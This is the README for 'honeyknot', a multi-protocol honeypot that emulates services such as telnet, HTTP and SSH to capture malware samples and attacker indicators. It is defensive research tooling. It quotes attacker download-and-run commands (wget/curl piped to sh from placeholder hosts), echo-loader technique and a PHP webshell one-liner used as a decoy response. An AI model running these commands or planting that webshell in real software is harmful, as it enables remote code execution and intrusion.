# honeyknot

A multi-port, multi-protocol honeypot for farming malware.

Honeyknot listens on many TCP and UDP ports, speaks enough of each protocol
to coax attackers into sending their actual payload, and captures everything
— raw byte streams, structured JSONL events, and deduplicated samples keyed
by SHA-256. Extracted indicators (URLs, IPs, download commands) land in the
event log at capture time, so triage is a `grep` or a `jq` away.

Where playing along gets more out of a session, it plays along. The telnet
handler runs an emulated BusyBox shell so IoT loaders pass their own
fingerprinting checks and get as far as dropping a payload; the HTTP handler
serves vulnerable-looking responses so the second stage actually arrives.
Every capture is also matched against a table of CVE and technique
signatures, so you record the delivery vehicle as well as the payload —
though since nothing here is real, every one of those is an *attempt*.

Requires Python 3.11+. Standard library only.

## Usage

```bash
# Minimum: bind IP is required
python -m honeyknot -i 0.0.0.0

# With common options
python -m honeyknot -i 0.0.0.0 -v -hd handlers/ -ld logs/

# From a Python shell (any daemon option can be passed as a keyword)
from honeyknot import run_from_interactive_shell
run_from_interactive_shell("0.0.0.0")
run_from_interactive_shell("0.0.0.0", pcap_enabled=True, conn_idle_timeout=30)
```

**Flags:**

| Flag | Default | Description |
|---|---|---|
| `-i` / `--bind-ip` | *required* | IP to bind listeners to |
| `-hd` / `--handler-dir` | `handlers/` | directory of TOML handler definitions |
| `-ld` / `--log-dir` | `logs/` | directory for all log output |
| `-v` / `--verbose` | off | debug-level console logging |
| `--event-log-max-bytes` | 100 MB | rotate `events.jsonl` at this size |
| `--event-log-backups` | 10 | number of rotated backups to keep |
| `--rate-limit-capacity` | 20 | token bucket capacity per source IP; `<=0` disables |
| `--rate-limit-refill` | 5 | per-IP token refill rate (tokens/sec) |
| `--run-as-user` | *none* | drop to this user after binding (root only) |
| `--run-as-group` | *none* | drop to this group after binding (root only) |
| `--yara-rules` | *none* | path to a `.yar` file or directory of rules (requires `yara-python`) |
| `--pcap` | off | write per-session PCAP-ng files to `logs/pcap/` |
| `--metrics-bind` | *none* | expose Prometheus metrics at `host:port`, e.g. `127.0.0.1:9099` |
| `--raw-dir-max-bytes` | 0 (off) | cap total size of `logs/raw/`; oldest files pruned when exceeded |
| `--conn-idle-timeout` | 120 | drop a TCP connection after this many seconds with no data; `0` disables |
| `--fetch-payloads` | **off** | download `http(s)` URLs seen in captures into the sample store. Makes outbound requests — read [Payload fetching](#payload-fetching-opt-in) before enabling |
| `--fetch-max-bytes` | 8 MB | byte ceiling per fetched payload |
| `--fetch-timeout` | 15 | socket timeout in seconds for a fetch |
| `--fetch-allow-private` | off | permit fetches to private/loopback addresses. Lab use only — this removes the SSRF guard |
| `--version` | — | print the version and exit |
| `--list-protocols` | — | print the built-in handler registry grouped by transport, then exit |
| `-tc` / `--thread-count` | 5 | accepted for back-compat; ignored under asyncio |

Signals:
- `SIGINT` / `SIGTERM` — graceful shutdown.
- `SIGHUP` — reload handler TOMLs in place. Unchanged listeners keep running;
  changed ones are stopped and restarted; added/removed ports are
  correspondingly bound/closed. A `config_reload` event records the diff.

Binding to ports <1024 requires root. Use `--run-as-user`/`--run-as-group`
to drop privileges immediately after binding — the daemon will call
`setgroups([])` + `setgid` + `setuid` before `serve_forever` is entered.
If you bind only to non-privileged ports, just run as an unprivileged user
to begin with.

## What you get when it runs

Under `logs/` you get four parallel outputs, each useful at a different level:

```
logs/
  console + per-port .log            # human-readable, rotated, 50 MB × 5
  events.jsonl                       # one JSON object per observed event
  raw/<ts>_<ip>_<port>[_udp].bin     # per-connection / per-datagram byte streams
  samples/<xx>/<sha256>.bin          # content-addressed, deduplicated
```

Every event in `events.jsonl` carries `ts`, `event`, `transport`, `port`,
`protocol`, `peer`, and event-specific fields. Event kinds:

- `connect`, `close` — TCP lifecycle; `close` includes `bytes_in` and `sha256`
- `datagram` — UDP datagram received; includes `bytes` and `sha256`
- `sample_new` — first time we've ever seen this `sha256`
- `analyzer_hit` — magic-byte identifier matched (ELF/PE/PDF/etc.); includes `offset`
- `ioc` — extracted URLs / IPv4 / IPv6 / `.onion` addresses / download commands (incl. Windows LOLBINs) / shell snippets
- `exploit_attempt` — the captured bytes match a known exploit or technique signature; includes `exploit_ids`, `categories`, `severity`
- `artifact` — a file reconstructed out of a session (echo-loader binary, heredoc script, `| sh` body); stored and analyzed in its own right
- `payload_fetch` — a URL honeyknot went and downloaded; only with `--fetch-payloads`
- `protocol` — handler-specific signal, carried as `"event": "protocol"` with the signal in a `name` field: `credentials`, `shell_command`, `http_request`, `vnc_auth_attempt`, etc.

All of these that describe one session share the same `sha256` and `peer`,
so correlating "which IP dropped this binary" is a trivial filter. See
[`EVENTS.md`](EVENTS.md) for the complete event catalog with required /
optional fields and join patterns.

A few starting points:

```bash
# every exploit attempt, by signature id. Two emitters, one shape: the
# capture pipeline (top-level) and handlers that classify mid-session
# (wrapped as event="protocol" with name="exploit_attempt").
jq -r 'select(.event=="exploit_attempt" or .name=="exploit_attempt")
       | .exploit_ids[]' logs/events.jsonl \
  | sort | uniq -c | sort -rn

# every dropper URL an emulated shell was told to fetch, with the source IP
jq -r 'select(.event=="protocol" and .name=="download_attempt")
       | .peer + " " + (.urls // [] | join(" "))' logs/events.jsonl

# every reconstructed artifact: what they called it, and where it landed
jq -r 'select(.event=="artifact")
       | [.peer, .kind, .name, .bytes, .sha256] | @tsv' logs/events.jsonl
```

## Offline triage

`honeyknot-stats` reads `events.jsonl` (and its rotated backups) and prints
a compact summary — no `jq` required:

```bash
python -m honeyknot.stats -ld logs/        # or: honeyknot-stats -ld logs/
python -m honeyknot.stats --events-file archived.jsonl -n 20
```

It reports total/unique counts, events by kind and protocol, the top source
peers, the most-seen samples by SHA-256, and aggregated IOCs (URLs, IPv4,
IPv6, `.onion`, downloaders).

## Metrics

With `--metrics-bind host:port`, `/metrics` exposes Prometheus text:
`honeyknot_events_total` (by event/port/protocol/transport),
`honeyknot_bytes_captured_total` (by port/protocol/transport),
`honeyknot_unique_samples`, `honeyknot_uptime_seconds`, and
`honeyknot_build_info{version=...}`.

## The deception layer and the emulated shell

Two handlers do more than negotiate and log, because for their traffic the
first packet is worthless and the fifth is the whole point.

**Telnet** (`honeyknot/shell.py`). IoT loaders fingerprint a host before
they spend a payload on it: walk out of a restricted CLI, run
`/bin/busybox <RANDOM_TOKEN>` and grep the reply for `applet not found`,
read `/proc/mounts` for somewhere writable, read a real binary's ELF header
to learn the CPU architecture. A wrong answer at any step and the loader
hangs up. So the post-login phase is a table-driven BusyBox emulator with a
virtual filesystem and a per-architecture ELF header — the point is step
five, and step five only happens if steps one through four are convincing.
When delivery comes, a `wget`/`curl` URL is recorded as a
`download_attempt` (and as an `ioc`, and with `--fetch-payloads` as a real
sample), while an `echo -ne '\x7fELF...' >> .s` echo-loader is reassembled
byte-for-byte into an `artifact`. Nothing is executed; every answer comes
from a table.

**HTTP** (`honeyknot/deception.py`). A honeypot that answers every probe
with `404` collects the first packet of every attack and the last packet of
none. So the handler serves convincing failures instead: an `.env` full of
credentials, a `?cmd=id` answered from the same shell emulator, a Docker
socket that accepts a container create (the spec names the miner image and
any host mounts), an admin form that takes a password. Every credential it
hands out is a **canary token** — deterministic per deployment, derived
from `[http] canary_seed`, and structurally plausible on purpose, because a
secret that obviously reads as fake gets discarded rather than used. They
authenticate nothing anywhere; if one turns up in a paste dump or on a real
system's auth log, that's proof of where it came from. Handing one out
emits `secret_served`.

**This changes response selection for existing HTTP deployments.** The order
is now (1) deception routes, (2) your configured `[[rules]]`, (3)
`[default_response]` — so a request that hits a deception route no longer
reaches your rules. The paths involved are ones an operator is unlikely to
have written a rule for, with one loud exception: on the default `generic`
profile, `/` is answered with an "It works!" page, which shadows a
`^GET / ` rule. Turn the whole layer off with:

```toml
[http]
deception = false
```

## Payload fetching (opt-in)

Most sessions hand us a *reference* to the malware rather than the malware:
`wget http://185.x.x.x/bins/arm7`, `curl -s http://x/x.sh | sh`. With
`--fetch-payloads`, honeyknot goes and gets those URLs, so the sample store
ends up holding the actual binary instead of a pointer to one that will be
offline in six hours. Fetched bytes run the same analyze / IOC / YARA /
exploit pipeline as a session capture and produce a `payload_fetch` event.

It is off by default because it is the only part of honeyknot that makes an
outbound connection, and that changes the deployment's risk profile in three
concrete ways:

- **Attribution.** Fetching announces "something at this IP parsed my
  payload". An operator watching their own server logs can conclude the host
  is a honeypot and stop feeding it. For long-lived passive collection,
  leave this off.
- **SSRF into your own network.** The URL is attacker-controlled. Honeyknot
  resolves the host, refuses private/loopback/link-local/reserved
  destinations, and re-checks the *connected peer address* after the socket
  is up so a DNS rebinding between check and connect still fails closed —
  but `--fetch-allow-private` removes that guard entirely. Lab use only.
- **You are downloading live malware.** It lands in `logs/samples/` like any
  other capture. It is never executed, but the directory now holds real
  payloads; treat it accordingly.

Bounded by construction: a byte ceiling per fetch (`--fetch-max-bytes`), a
socket timeout (`--fetch-timeout`), at most 4 concurrent fetches, a
process-lifetime budget of 5000 fetches, and a seen-URL set so a botnet
hammering one dropper for a week costs one request. Redirects are followed
at most 3 deep and every hop is re-vetted. TLS certificates are deliberately
not verified — malware C2 certs are self-signed or expired essentially
always, and we want the bytes, not a trust decision.

## Handler definitions

Each port is configured by one TOML file in the handlers directory. The
minimum is just `[service]` with a port and a protocol name.

### Example: stateful SSH honeypot

```toml
[service]
port = 22
protocol = "ssh"

[ssh]
banner = "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1"
```

### Example: HTTP posing as an exposed Docker host

```toml
[service]
port = 2375
type = "http"
protocol = "http"

[http]
deception = true            # default; false disables the whole layer
profile = "docker"          # generic | docker | elasticsearch | tomcat | springboot | router
hostname = "srv-web-01"     # used in decoy content and as the default canary seed
canary_seed = "site-7"      # scopes the canary tokens to this deployment
server = "Docker/20.10.7 (linux)"   # Server: header; defaults per profile
docker_version = "20.10.7"
shell_user = "www-data"     # who `id` reports for commands run via ?cmd=
arch = "x86_64"             # architecture the emulated shell claims
```

`profile` picks the `Server:` banner and which API surface answers:
`docker` and `elasticsearch` add their respective API routes; `tomcat`,
`springboot` and `router` change the banner only. The path-based decoys
(`.env`, `/.git/`, `/actuator/*`, `wp-config.php`, login forms, webshell
`?cmd=` handling) fire on every profile.

### Example: telnet as a MIPS router

```toml
[service]
port = 23
protocol = "telnet"

[telnet]
hostname = "gateway"
arch = "mips"           # x86_64 | i686 | arm | arm64 | mips | mipsel | ppc | sh4 | m68k | sparc
kernel = "3.10.14"      # what `uname -r` and /proc/version report
reject_first = 0        # fail this many logins before accepting; 0 accepts immediately
motd = "\r\nBusyBox v1.20.2 built-in shell (ash)\r\n\r\n"
```

`arch` is the important one: it decides the ELF header served for
`cat /bin/echo` and the `uname -m` string, and loaders pick which payload to
send from exactly that. Set it to match the device you are pretending to be
or you will collect the wrong binary. `reject_first` exists because some
loaders verify that *wrong* credentials are refused before trusting a host;
the default of 0 maximizes the number of sessions that reach the payload
stage.

### Example: regex-based HTTP handler (back-compat)

```toml
[service]
port = 8080
type = "http"
protocol = "regex"

[response_headers]
status_line = "HTTP/1.1 200 OK"
headers = ["Server: nginx/1.18.0", "Content-Type: text/html"]

[default_response]
body = "<html><body>ok</body></html>"

[[rules]]
name = "php"
pattern = '^GET /.*\.php'
response = '<?php system($_REQUEST["cmd"]); ?>'
```

### Config reference

`[service]`
- `port` — int, required
- `protocol` — one of the built-in handlers (see below); defaults to `regex`
- `transport` — `tcp` or `udp`; auto-inferred from `protocol` for UDP-only ones
- `type` — `http`, `https`, or `tcp`; defaults to `tcp`. Meaningful only for HTTPS TLS setup
- `description` — free text
- `encoding` — default `utf-8`, used by the regex matcher

`[response_headers]` *(regex handler only)*
- `status_line` — required
- `headers` — list of strings

`[default_response]` *(regex handler only)*
- `body` — sent when no rule matches

`[[rules]]` *(regex handler only, ordered)*
- `name` — label for logs
- `pattern` — Python regex, compiled at load time, case-insensitive
- `response` — string

`[tls]` *(optional; wraps any TCP handler in TLS)*
- `enabled` — `true` to enable; also implicit if `type = "https"` or if
  both `certfile` and `keyfile` are set
- `certfile`, `keyfile` — paths to a PEM cert/key pair. For dev/demo,
  generate them with:
  ```bash
  python -m honeyknot.gencert        # writes logs/tls.{cert,key}
  ```
  The bundled IMAPS/POP3S/MQTTS/SMTPS TOMLs reference `logs/tls.*` by
  default.

`[<protocol>]` — optional per-handler options, e.g. `[ssh] banner = ...`,
`[smtp] hostname = ...`, `[dns] answer_a = "1.2.3.4"`.

`[http]`
- `deception` — bool, default `true`. Disables the deception layer entirely,
  restoring pre-batch behaviour (`[[rules]]` then `[default_response]`)
- `profile` — `generic` (default), `docker`, `elasticsearch`, `tomcat`,
  `springboot`, `router`
- `hostname` — default `srv-web-01`; appears in decoy content
- `canary_seed` — default: the `hostname` value. Scopes canary tokens
- `server` — `Server:` header; defaults per profile
- `docker_version` — default `20.10.7`; `elasticsearch_version` — default `6.8.6`
- `shell_user` — default `www-data`; `arch` — default `x86_64`; `kernel` —
  default `3.10.14`. These configure the shell emulator that answers
  `?cmd=`-style requests

`[telnet]`
- `hostname` — default `localhost`
- `arch` — default `x86_64`; see the example above for the full list
- `kernel` — default `3.10.14`
- `motd` — banner printed after a successful login
- `reject_first` — int, default `0`; number of logins to refuse before accepting

## Built-in protocol handlers

**TCP, stateful session:**
- `ssh` — banner exchange, captures client banner and first KEX packet
- `smtp` — 220 → HELO/EHLO → MAIL/RCPT → DATA → body → QUIT
- `ftp` — full command dialog, credential capture, data channel refused
- `telnet` — IAC negotiation, credential capture, then an emulated BusyBox shell that reconstructs dropped files
- `redis` — RESP parser with pipelining, permissive acks
- `vnc` — RFB 3.8 handshake, captures 16-byte auth response then fails
- `http` — full request parser; headers + Content-Length or chunked body, pipelining, `Connection: close`, `h2_preface` event for HTTP/2 scanners, deception routes, and `CONNECT` accepted as proxy abuse (tunneled bytes captured, nothing relayed)
- `rtsp` — poses as an IP camera; 401s with Digest+Basic to harvest camera passwords, then serves SDP so the scanner walks on to SETUP/PLAY
- `socks` — SOCKS4/4a/5 open proxy that proxies nothing; completes the handshake and records the destination asked for
- `rsync` — daemon negotiation with a fake module list; captures the challenge-auth response and the argument vector (`--sender` = pulling data out)
- `finger` — user enumeration and `user@host` relay-bounce attempts, refused
- `amqp` — AMQP 0-9-1 RabbitMQ mimic; captures SASL PLAIN/AMQPLAIN credentials and logs every method
- `zookeeper` — four-letter-word admin commands (`ruok`/`stat`/`envi`/`mntr`) plus the binary client handshake
- `mqtt` — CONNECT parser; captures `client_id`/`username`/`password`; CONNACK + PINGRESP + SUBACK
- `mysql` — protocol-10 greeting; parses HandshakeResponse, captures user + auth response bytes; Access denied
- `postgres` — handles SSLRequest + StartupMessage, captures user/db; AuthenticationCleartextPassword; captures password; ErrorResponse
- `imap` — LOGIN + AUTHENTICATE PLAIN credential capture, CAPABILITY, LOGOUT
- `pop3` — APOP-style banner + USER/PASS or APOP digest capture
- `ldap` — minimal BER parser; captures `bindRequest` DN + simple password (`credentials`) and `searchRequest` baseObject (`ldap_search`); replies success
- `adb` — Android Debug Bridge; completes the `A_CNXN` handshake and logs every `A_OPEN` `shell:` destination (`adb_connect` / `adb_open`)

**TCP, binary fingerprinting:**
- `smb` — SMB1 Negotiate response, captures post-negotiate probes
- `mssql` — TDS Pre-Login + captures LOGIN7 + error token
- `rdp` — X.224 Connection Confirm selecting TLS, captures ClientHello + emits `tls_sni` event
- `modbus` — MBAP framing parser, responds to Read Coils / Read Registers / Read Device Identification
- `s7` — Siemens S7comm: COTP CR/CC handshake, Setup Communication ack, logs subsequent Read/Write Var
- `jdwp` — Java Debug Wire Protocol; echoes the handshake and answers the VirtualMachine command set so `jdwp-shellifier`-style tools reach `invokeMethod` and hand over their command line
- `rmi` — JRMP registry; completes the handshake so ysoserial/JNDI payloads arrive in full, then mines the serialized stream for class names and gadget markers. Nothing is ever deserialized

**UDP:**
- `dns` — parses query, returns canned A record
- `snmp` — extracts community string, silent (realistic drop on bad community)
- `ssdp` — responds to M-SEARCH with configurable USN/server
- `netbios_ns` — decodes first-level-encoded name, silent
- `chargen` — short fixed reply, refuses amplification
- `memcached` — silent (amplification defense)
- `sip` — OPTIONS 200 / REGISTER 401-nonce to invite Authorization Digest follow-up
- `ipmi` — ASF-RMCP Presence Pong
- `coap` — parses header + Uri-Path; returns 2.05 Content ack
- `wsd` — WS-Discovery Probe logger + non-amplifying ProbeMatches
- `bacnet` — BACnet/IP Who-Is → I-Am responder (configurable device instance + vendor id)
- `tftp` — RRQ/WRQ filename + mode capture (`tftp_request`); refuses with an ERROR packet
- `ntp` — mode-3 client query → same-size mode-4 reply; logs and drops mode-6/mode-7 (`monlist`) without amplifying
- `rpcbind` — ONC RPC portmapper; logs GETPORT/DUMP/CALLIT recon, answers "not registered", and never sends a reply larger than the request

**Fallback:**
- `regex` — back-compat one-shot client-speaks-first matcher; the default

## Development

```bash
python3 -m venv .venv && source .venv/bin/activate
pip install ruff pytest

ruff check honeyknot/ tests/
pytest -q
pytest tests/test_protocols_vnc_http.py::TestHTTP::test_chunked_body_decoded
```

## Deployment

See `contrib/` for:
- `Dockerfile` — python:3.13-slim, non-root, `CAP_NET_BIND_SERVICE`
- `docker-compose.yml` — volume-mounted handlers, bounded logs volume, metrics-to-loopback
- `honeyknot.service` — hardened systemd unit (`NoNewPrivileges`, `ProtectSystem=strict`, `PrivateTmp`, restricted syscall filter)

`systemctl reload honeyknot` triggers a SIGHUP reload; under
docker-compose use `docker compose kill --signal=HUP`.

## Roadmap

See [`ROADMAP.md`](ROADMAP.md) for remaining planned work.
